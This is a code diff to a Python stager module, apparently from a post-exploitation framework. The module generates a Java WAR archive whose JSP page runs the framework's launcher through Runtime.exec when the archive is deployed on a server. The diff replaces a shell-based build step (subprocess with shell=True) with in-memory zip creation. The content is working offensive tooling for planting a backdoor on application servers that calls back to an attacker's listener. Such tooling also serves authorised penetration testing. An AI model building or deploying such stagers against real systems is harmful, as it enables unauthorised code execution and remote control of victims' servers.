@@ -1,5 +1,6 @@
 from lib.common import helpers
-import subprocess
+import zipfile
+import StringIO
 
 class Stager:
 
@@ -26,16 +27,16 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'OutDir' : {
-                'Description'   :   'Directory to output WAR to.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/'
+            'AppName' : {
+                'Description'   :   'Name for the .war/.jsp. Defaults to listener name.',
+                'Required'      :   False,
+                'Value'         :   ''
             },
-            'Base64' : {
-                'Description'   :   'Switch. Base64 encode the output.',
+            'OutFile' : {
+                'Description'   :   'File to write .war to.',
                 'Required'      :   True,
-                'Value'         :   'True'
-            },            
+                'Value'         :   ''
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -68,53 +69,53 @@ class Stager:
 
         # extract all of our options
         listenerName = self.options['Listener']['Value']
-        base64 = self.options['Base64']['Value']
+        appName = self.options['AppName']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-	directoryName = self.options['OutDir']['Value']
 
-        encode = False
-        if base64.lower() == "true":
-            encode = True
+        # appName defaults to the listenername
+        if appName == "":
+            appName = listenerName
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-	elif directoryName[-1] != "/":
-            print helpers.color("[!] Error in OutDir Value. Please specify path like '/tmp/'")
-            return ""
-	else:
-	#Create initial JSP and Web XML Strings with placeholders
-		jspCode = '''<%@ page import="java.io.*" %>
-			<% 
-			Process p=Runtime.getRuntime().exec("launcher");
-			%>
-			'''
- 
-		wxmlCode = '''<?xml version="1.0"?>
-			<!DOCTYPE web-app PUBLIC 
-			"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
-			"http://java.sun.com/dtd/web-app_2_3.dtd">
-			<web-app>
-			<servlet>
-			<servlet-name>listenerName</servlet-name>
-			<jsp-file>/listenerName.jsp</jsp-file>
-			</servlet>
-			</web-app>
-			'''
-		#Replace String placeholders with defined content
-		jspCode = jspCode.replace("launcher", launcher)
-		wxmlCode = wxmlCode.replace("listenerName", listenerName, 2)
-		#Write out  modified strings to apropriate files
-		with open(directoryName + listenerName + ".jsp", "w") as jspFile:
-			jspFile.write(jspCode)
-		with open(directoryName + "web.xml", "w") as webxmlFile:
-			webxmlFile.write(wxmlCode)
-		#Create necessary directory structure, move files into appropriate place, compile, and delete unncessary left over content
-		proc = subprocess.call("cd "+ directoryName + "&&mkdir warDir&&mkdir warDir/WEB-INF&&mv listenerName.jsp warDir&&mv web.xml warDir/WEB-INF&&cd warDir&&jar cvf listenerName.war *&&mv listenerName.war ../&&cd ..&&rm -rf warDir".replace ("listenerName", listenerName, 3), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		
-        return "Your file " + listenerName + ".war was successfully generated and placed within " + directoryName +". Please note that the .war and .jsp are both named after the specified Listener."
+
+        else:
+            # .war manifest
+            manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"
+
+            # Create initial JSP and Web XML Strings with placeholders
+            jspCode = '''<%@ page import="java.io.*" %>
+<% 
+Process p=Runtime.getRuntime().exec("'''+str(launcher)+'''");
+%>
+'''
+
+            # .xml deployment config
+            wxmlCode = '''<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC 
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
+"http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>%s</servlet-name>
+<jsp-file>/%s.jsp</jsp-file>
+</servlet>
+</web-app>
+''' %(appName, appName)
+
+            # build the in-memory ZIP and write the three files in
+            warFile = StringIO.StringIO() 
+            zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)
+
+            zipData.writestr("META-INF/MANIFEST.MF", manifest)
+            zipData.writestr("WEB-INF/web.xml", wxmlCode)
+            zipData.writestr(appName + ".jsp", jspCode)
+            zipData.close()
+
+            return warFile.getvalue()
